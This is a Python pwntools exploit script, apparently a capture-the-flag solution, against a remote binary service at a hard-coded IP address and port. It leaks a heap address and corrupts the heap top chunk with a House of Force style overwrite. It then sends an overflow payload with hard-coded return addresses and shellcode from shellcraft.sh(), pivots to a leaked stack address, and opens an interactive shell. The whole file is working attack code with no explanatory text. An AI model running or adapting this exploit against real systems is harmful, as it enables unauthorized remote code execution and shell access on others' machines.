from pwn import *
context(log_level='debug',os='linux',arch='amd64')


# p=process('./1')
p =remote("59.110.164.72",10025)
elf=ELF('./1')
shellcode = asm(shellcraft.sh())
# gdb.attach(p,"b *0x400a28")
# pause()
payload1 =b"\x00"*24
p.sendafter(b"Start injecting\n",payload1)

p.recvuntil(b"materials\n")
heap_addr = int(p.recv(8),10)
print (heap_addr)
# heap_addr =int((heap_addr),16)
print (hex(heap_addr))
sleep(0.1)

p.sendline(str(-1))           #change top_chunk
sleep(0.1)
p.sendline(str(6296200-heap_addr))       #get_size
p.sendafter(b"Answer time is close to over\n","a"*0x10)



# gdb.attach(p,"b *0x400b49")
# pause()
payload2= b"a"*0x60+p64(0x6012a0+0x80+0x120)+p64(0x4008e3)+b"a"*0x10+\
    p64(0x6012a0+0x60)+p64(0x400914)+shellcode

p.sendafter(b"irect to destination\n",payload2)

p.recvuntil(b"you pass")
# sleep()
p.recv(0x1b0)
sleep(0.5)
stack = u64(p.recvuntil(b"\x7f").ljust(8,b"\x00"))-0xd0
print(hex(stack))

# gdb.attach(p,"b *0x4008e3")
# pause()
payload3 = b"a"*0x68+p64(stack)
p.sendline(payload3)
p.interactive()